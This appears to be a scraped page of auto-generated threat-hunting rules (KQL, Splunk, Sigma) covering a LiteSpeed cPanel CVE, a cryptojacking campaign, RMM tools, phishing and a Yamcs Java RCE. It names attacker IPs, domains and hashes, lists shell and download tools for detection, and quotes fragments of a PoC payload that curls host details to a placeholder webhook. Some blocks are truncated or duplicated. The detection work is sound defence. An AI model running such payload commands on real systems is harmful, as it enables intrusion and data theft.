[LLM] LiteSpeed cPanel plugin redisAble exploitation attempt (CVE-2026-48172) Exploitation High
Hunts for HTTP requests invoking the vulnerable cPanel JSON API function `redisAble` exposed by the LiteSpeed cPanel user-end plugin v2.3-v2.4.4. The article's own IoC (`cpanel_jsonapi_func=redisAble`) appears in cPanel access logs whenever the privilege-escalation vector is being touched, including pre-auth scans and successful RCE-to-root attempts. Rationale: Anchored directly on the article's own grep IOC `cpanel_jsonapi_func=redisAble` — the exact string LiteSpeed's advisory tells defenders to scan logs for. The Defender branch covers post-exploit shape (CVE description = arbitrary script as root via lsws.redisAble), so we catch both the URL touch and the resulting root shell. Splunk Web DM + IIS/Syslog/CSL union covers WAF, reverse-proxy and direct-server log paths so the detection survives whatever the customer is forwarding to Sentinel. Cross-checked CISA KEV catalog entry to confirm CVE-2026-48172 actively exploited. Cross-checked against: • https://www.cisa.gov/known-exploited-vulnerabilities-catalog • https://www.litespeedtech.com/support/wiki/doku.php/litespeed_wiki:cpanel
ATT&CKT1190 T1068
Data sourcesWeb.Web
// Two-pronged hunt on Defender-for-Linux telemetry — (1) the cPanel access-log file getting written with the IOC string, (2) root-context shell/LOLBIN spawned by the LiteSpeed/cPanel PHP worker (post-exploit shape per the CVE description).
let IOCWriteEvents = DeviceFileEvents
    | where Timestamp > ago(7d)
    | where FolderPath has_any ("/usr/local/cpanel/logs", "/var/cpanel/logs")
    | where FileName has_any ("access_log", "error_log", "login_log")
    | extend Vector = "IOC log write"
    | project Timestamp, DeviceId, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine, Vector;
let RootChildOfLsws = DeviceProcessEvents
    | where Timestamp > ago(7d)
    | where InitiatingProcessFileName has_any ("lsws", "lsphp", "litespeed", "cpsrvd", "httpd", "whostmgrd")
    | where AccountName =~ "root"
    | where FileName in~ ("sh","bash","dash","zsh","perl","python","python3","curl","wget","nc","ncat","chmod","chown","chattr","socat")
    | extend Vector = "Root LOLBIN spawned by LiteSpeed/cPanel worker"
    | project Timestamp, DeviceId, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, Vector;
union IOCWriteEvents, RootChildOfLsws
| order by Timestamp desc
// Use proper Sentinel columns for each table — Syslog has Computer/HostName (no DeviceName); CommonSecurityLog has DestinationHostName/SourceHostName (no DeviceName).
let IOC = "cpanel_jsonapi_func=redisAble";
union isfuzzy=true
  (Syslog
     | where TimeGenerated > ago(7d)
     | where SyslogMessage has IOC
     | project TimeGenerated, Host=coalesce(HostName, Computer), SrcIp=HostIP, Facility, ProcessName, Detail=SyslogMessage, Source="Syslog"),
  (CommonSecurityLog
     | where TimeGenerated > ago(7d)
     | where RequestURL has IOC or Message has IOC or RequestContext has IOC
     | project TimeGenerated, Host=DestinationHostName, SrcIp=SourceIP, Facility=DeviceProduct, ProcessName=DeviceEventClassID, Detail=coalesce(RequestURL, Message), Source="WAF/CSL"),
  (W3CIISLog
     | where TimeGenerated > ago(7d)
     | where csUriQuery has IOC or csUriStem has IOC
     | project TimeGenerated, Host=Computer, SrcIp=cIP, Facility=sSiteName, ProcessName=csMethod, Detail=strcat(csUriStem, "?", csUriQuery), Source="IIS-fronted")
| order by TimeGenerated desc

[LLM] Cryptojacking lure: ZIP download from gleeze.com / giize.com SEO+AI-poisoned utility sites Delivery High
Hunts endpoint downloads of ZIP archives sourced from the campaign's attacker-controlled domains (gleeze.com subdomains, giize.com, directdownload.icu) that impersonate GPU/system utilities like CrystalDiskInfo, HWMonitor, FurMark and PDFgear. This is the article-specific initial-access vector surfaced via SEO and AI-chatbot recommendation poisoning, not generic drive-by. Rationale: Domains gleeze.com (and subdomains direct-download/start-download/minemine), giize.com and directdownload.icu are named in the article and confirmed in Microsoft's blog as the ZIP-delivery infrastructure (Dynu dynamic DNS). ZIP + campaign-domain referrer is high-fidelity. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/ • https://gbhackers.com/seo-poisoning-attack/

[LLM] ScreenConnect masquerade: msiexec.exe installing rogue vcredist_x64.dll after autorun.dll sideload Installation High
Hunts the campaign's stage-2 install where a sideloaded autorun.dll uses msiexec.exe to install a second DLL named vcredist_x64.dll, which is actually a packaged ScreenConnect (ConnectWise Control) installer. vcredist is normally an .exe bootstrapper, never a DLL pushed through msiexec, making this combination highly specific. Rationale: vcredist_x64.dll installed via msiexec.exe is named in both the article and Microsoft's blog as the ScreenConnect packaging trick; legitimate VC++ redistributables never deploy a DLL through msiexec, so the string pair is near-zero-FP. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/ • https://gbhackers.com/seo-poisoning-attack/

[LLM] SimpleRunPE.exe / D3F4E2A1 implant adding Microsoft Defender exclusions via Add-MpPreference Installation Medium
Hunts the implant disabling protection by registering Defender path/process/extension exclusions, tied to the campaign by either the SimpleRunPE.exe / masqueraded vlc.exe parent or the campaign identifier D3F4E2A1 (also seen as mutex Global\D3F4E2A1_Svc and install folder). The malware re-applies these exclusions if removed. Rationale: Add-MpPreference exclusion registration is named in the article and Microsoft's blog ("re-configures Defender exclusions"); pinning to SimpleRunPE.exe parent or the D3F4E2A1 campaign ID (confirmed mutex Global\D3F4E2A1_Svc) removes the legitimate-admin noise. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/ • https://gbhackers.com/seo-poisoning-attack/

[LLM] Masqueraded vlc.exe launched via scheduled task with self-deleting PowerShell dropper Installation Medium
Hunts the alternate delivery path where PowerShell fetches the payload from a remote drive, saves it locally as vlc.exe to blend in, registers a scheduled task to launch it, then deletes itself. Detection keys on a vlc.exe process whose signer/company is not VideoLAN and/or that runs from a non-standard path under a scheduled-task or PowerShell parent. Rationale: The article specifies the binary is saved as vlc.exe "to fly under the radar," launched via a scheduled task, with a self-deleting PowerShell dropper. A vlc.exe outside VideoLAN's path with a non-VideoLAN signer and schtasks/PowerShell parent is the article-specific masquerade. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/

[LLM] GPU miner execution: gminer / lolMiner / SRBMiner-MULTI dropped at runtime Actions on Objectives High
Hunts execution or on-disk drop of the three GPU-mining tools the implant fetches at runtime — gminer, lolMiner, and SRBMiner-MULTI — which is the campaign's resource-hijacking endgame on high-GPU hosts. The implant also process-hollows the miner under a trusted binary and terminates if monitoring tools (taskmgr/processhacker/procexp/systeminformer) appear. Rationale: gminer, lolMiner and SRBMiner-MULTI are explicitly named in the article and Microsoft's blog as the three supported miners; their binary names plus stratum/pool args are high-fidelity resource-hijacking indicators on GPU-equipped endpoints. Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Threshold detection: many files renamed in short window, often with new extension.

DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host

| order by files desc

ImFileEvent

| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files

Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe")
   or FileName matches regex @"(?i)kaseya.*\.exe"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\AnyDesk.exe"
   or NewProcessName endswith "\TeamViewer.exe"
   or NewProcessName endswith "\TeamViewer_Service.exe"
   or NewProcessName endswith "\ScreenConnect.ClientService.exe"
   or NewProcessName endswith "\ConnectWiseControl.ClientService.exe"
   or NewProcessName endswith "\atera_agent.exe"
   or NewProcessName endswith "\SplashtopStreamer.exe"
   or NewProcessName endswith "\RustDesk.exe"
   or NewProcessName endswith "\NinjaOne.exe"
| project TimeGenerated, Computer, Account, NewProcessName,
          CommandLine, ParentProcessName
| order by TimeGenerated desc

title: Remote-Management (RMM) Tool Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0c
status: experimental
description: |
    AnyDesk / TeamViewer / ScreenConnect / Atera / Splashtop /
    RustDesk — RMM tools attackers commonly install for hands-on-
    keyboard access. Filter against the IT estate's known tool.
references:
    - https://attack.mitre.org/techniques/T1219/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1219
    - attack.command-and-control
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\AnyDesk.exe'
            - '\TeamViewer.exe'
            - '\TeamViewer_Service.exe'
            - '\ScreenConnect.ClientService.exe'
            - '\ConnectWiseControl.ClientService.exe'
            - '\atera_agent.exe'
            - '\SplashtopStreamer.exe'
            - '\RustDesk.exe'
            - '\NinjaOne.exe'
    condition: selection
falsepositives:
    - IT-approved RMM in use across the estate. Maintain a known-IT-
      tool exclusion list per environment.
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("193.42.11.108", "93.115.10.35", "198.23.185.238", "2.59.132.106") or RemoteUrl has_any ("gleeze.com", "direct-download.gleeze.com", "start-download.gleeze.com", "minemine.gleeze.com", "direct-downloads.giize.com", "free-download.giize.com", "directdownload.icu")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic(["193.42.11.108", "93.115.10.35", "198.23.185.238", "2.59.132.106"]);
let BadDomains = dynamic(["gleeze.com", "direct-download.gleeze.com", "start-download.gleeze.com", "minemine.gleeze.com", "direct-downloads.giize.com", "free-download.giize.com", "directdownload.icu"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |
    Replace `__IP_LIST__` / `__DOMAIN_LIST__` placeholders with
    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:
    - https://attack.mitre.org/tactics/TA0011/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: windows
detection:
    selection_ip:
        DestinationIp:
            - '__IP_PLACEHOLDER_1__'
            - '__IP_PLACEHOLDER_2__'
    selection_domain:
        DestinationHostname:
            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'
    condition: selection_ip or selection_domain
falsepositives:
    - None on a true-positive IOC match
level: critical
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.dest IN ("193.42.11.108", "93.115.10.35", "198.23.185.238", "2.59.132.106")
    by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| append
    [| tstats `summariesonly` count from datamodel=Web
        where Web.dest IN ("gleeze.com", "direct-download.gleeze.com", "start-download.gleeze.com", "minemine.gleeze.com", "direct-downloads.giize.com", "free-download.giize.com", "directdownload.icu")
        by Web.src, Web.dest, Web.url, Web.user
     | `drop_dm_object_name(Web)`]
| append
    [| tstats `summariesonly` count from datamodel=Network_Resolution.DNS
        where DNS.query IN ("gleeze.com", "direct-download.gleeze.com", "start-download.gleeze.com", "minemine.gleeze.com", "direct-downloads.giize.com", "free-download.giize.com", "directdownload.icu")
        by DNS.src, DNS.query, DNS.answer
     | `drop_dm_object_name(DNS)`]
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.dest IN ("193.42.11.108", "93.115.10.35", "198.23.185.238", "2.59.132.106")
    by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| append
    [| tstats summariesonly=false count from datamodel=Web
        where Web.dest IN ("gleeze.com", "direct-download.gleeze.com", "start-download.gleeze.com", "minemine.gleeze.com", "direct-downloads.giize.com", "free-download.giize.com", "directdownload.icu")
        by Web.src, Web.dest, Web.url, Web.user
     | `drop_dm_object_name(Web)`]
| append
    [| tstats summariesonly=false count from datamodel=Network_Resolution.DNS
        where DNS.query IN ("gleeze.com", "direct-download.gleeze.com", "start-download.gleeze.com", "minemine.gleeze.com", "direct-downloads.giize.com", "free-download.giize.com", "directdownload.icu")
        by DNS.src, DNS.query, DNS.answer
     | `drop_dm_object_name(DNS)`]

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["16562974deec80e41ef57a71a6de8c03ceb393005fb1432f8d9d82c61294ef8c", "1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5", "062bb28765fbaa11f8cc341fa16e2c7f942a122d929cb41f4a0f755b4429f246", "c7425fbe6c3a4937934215c54027d4b67202d12ab490682fae03498870d66d06", "a460d00ef93c8ce70d32e48e55781af66a53328fc2dde45519be196c265de074", "db2d33c4e6e4a5c2263b56e8303c343305a94dde1fc2968304ba260acbbd9f9f", "cf3f8160eb5a5580e0c35054847e3ac4d01e9fe74fab8bc12bf6e8a40bf696b2", "69077fcf940fc5852fb32beed15636756ebc04ac971b7ed71d36251e7ea70a20", "2ee93ccbcd49ed94c65dcf52e7dcb8f0fa0a443ca24c0e0c7f79152efba657b7", "9ff07c9fafa9c03fdf69e4abf6806aa7c938b5480e7e258f227db0719ecd6386", "7035c2abeb617e828dfda1b119b8544fa9ae15a1d263d18bc5506acaf381f496", "e021662a652ba95c8778b991056696ab3c9b0f60d5e23b1e6cf73c3847db6610"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

title: File or Process Matching Article Hash IOCs

status: experimental

[LLM] Yamcs JVM spawning OS shell/interpreter (Janino RCE via CVE-2026-44632) Exploitation High
Hunts the Yamcs Java mission-control process (java/yamcsd) spawning a Unix shell or command interpreter (bash/sh/curl/wget/python/nc) as a child. The Janino SimpleCompiler RCE compiles attacker-supplied algorithm text containing java.lang.Runtime.getRuntime().exec(), so a JVM-parent → shell-child tree on a Yamcs host is the core post-exploitation signal that the injected algorithm executed. Rationale: Anchored on the article's PoC payload `java.lang.Runtime.getRuntime().exec(new String[]{"bash","-c","curl ..."})` — the deterministic post-exploitation artefact is a Yamcs JVM (java/yamcsd) parent forking a shell/network tool, which a mission-control JVM almost never does legitimately. Cross-checked against GHSA-524g-x36v-9wm6 and CIRCL Vulnerability-Lookup. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://vulnerability.circl.lu/vuln/ghsa-524g-x36v-9wm6 • https://github.com/yamcs/yamcs
ATT&CKT1059.004 T1190

[LLM] Yamcs MDB algorithm override PATCH with Java Runtime payload Delivery Medium
Hunts authenticated HTTP PATCH requests to the Yamcs Mission Database algorithm override endpoint (/api/mdb/<instance>/<processor>/algorithms/...), the exact exploitation vector for CVE-2026-44632. High-fidelity when the request body / URL contains java.lang.Runtime or Runtime.getRuntime, indicating an injected OS-command payload rather than a benign algorithm edit. Rationale: Uses the exact endpoint shape from the PoC curl — `PATCH /api/mdb/<instance>/<processor>/algorithms/...` with `action:SET` and a `text` field embedding `java.lang.Runtime.getRuntime().exec()`. URL+method alone is a benign admin action so this is hunting-tier; the body/Message match on Runtime.getRuntime is what elevates fidelity where the WAF logs request bodies. Defender has no inbound web-server table for the Yamcs JVM, so defender_kql is intentionally empty. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://docs.yamcs.org/yamcs-server-manual/mdb/algorithm-definitions/
ATT&CKT1190 T1059

   or RequestURL has "/algorithms/"

[LLM] Outbound recon callback from Yamcs host (curl/shell child of JVM to public IP) Command & Control High
Hunts external network connections initiated by a shell or download tool (curl/wget/bash/python/nc) whose parent is the Yamcs JVM. CVE-2026-44632's PoC payload exfiltrates host recon via `curl https://<webhook>/$(hostname)_$(whoami)`, so a java-parented curl reaching a public IP confirms successful RCE and data egress. Rationale: Targets the PoC's egress shape — a curl/shell child of the Yamcs JVM beaconing host recon (`$(hostname)_$(whoami)`) to an attacker webhook over a public IP. Distinct network pivot from UC1's process tree. Sentinel ASIM ImNetworkSession carries no initiating-parent-process lineage so sentinel_kql is left empty; SPL Network_Traffic lacks parent lineage and is therefore a coarser app-based approximation — the Defender/Falcon EDR queries are the authoritative form. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://vulnerability.circl.lu/vuln/ghsa-524g-x36v-9wm6
ATT&CKT1071.001 T1041 T1082

2026-05-27 3 use cases 2 techniques 4 kill-chain phases detected

Command & Control. Beacon to attacker infrastructure for control and tasking.

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
